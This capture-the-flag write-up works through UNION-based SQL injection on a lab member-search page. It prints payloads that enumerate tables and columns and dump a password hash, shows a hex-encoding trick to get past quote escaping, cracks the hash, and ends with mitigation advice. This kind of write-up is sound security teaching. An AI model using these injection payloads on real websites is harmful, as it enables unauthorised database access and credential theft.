# 👤 Flag: SQL Injection Member — UNION-based SQL Injection on Member Search

## Vulnerability Type
**SQL Injection** — UNION-based data extraction with hex encoding bypass

## Description

The Members search page accepts a numeric ID to look up users. The input field is not sanitized, making the underlying SQL query injectable. This was the **first flag discovered** in the project.

## Exploit Walkthrough

### Step 1 — Confirm vulnerability

```sql
1 = 1 OR 1
```

Returns multiple users, including one named **"get the flag"** — a strong hint that SQL injection is the intended path.

### Step 2 — Determine number of columns

```sql
1 UNION SELECT 1,2
```

✅ Returns results → the query uses **2 columns**.

### Step 3 — Enumerate tables

```sql
1 UNION SELECT table_name, 2 FROM information_schema.tables
```

Notable tables found:
- `Users`
- `Guestbook`
- `Vote_dbs`

### Step 4 — Enumerate columns in `users`

A direct string comparison is blocked by the server, which escapes special characters with backslashes (a basic SQLi mitigation). The workaround: **convert the table name to hexadecimal**:

```sql
-- "users" in hex = 0x7573657273
1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 0x7573657273
```

Columns found in `users`:

| Column | Content |
|--------|---------|
| `Commentaire` | Instructions / hint |
| `countersign` | The hashed password |

### Step 5 — Extract credentials

```sql
1 UNION SELECT Commentaire, countersign FROM users
```

Returns:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

### Step 6 — Decode and convert

| Step | Value |
|------|-------|
| MD5 hash | `5ff9d0165b4f92b14994e5c685cdce28` |
| MD5 decoded | `FortyTwo` |
| Lowercase | `fortytwo` |
| SHA-256 of `fortytwo` | `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5` |

The SHA-256 hash is the **flag**.

## Key Technique: Hex Encoding to Bypass WAF

The server escapes quotes and special characters, blocking string literals like `'users'`. By converting the string to its hexadecimal representation (`0x7573657273`), the comparison works without any quotes, bypassing the filter entirely.

## Mitigation

- Use **parameterized queries / prepared statements**.
- Escaping special characters (as the server partially tried) is **not sufficient** — hex encoding bypasses it.
- Restrict database user permissions: the web app should not have access to `information_schema`.
- Consider a Web Application Firewall (WAF) with deep SQL injection pattern detection.
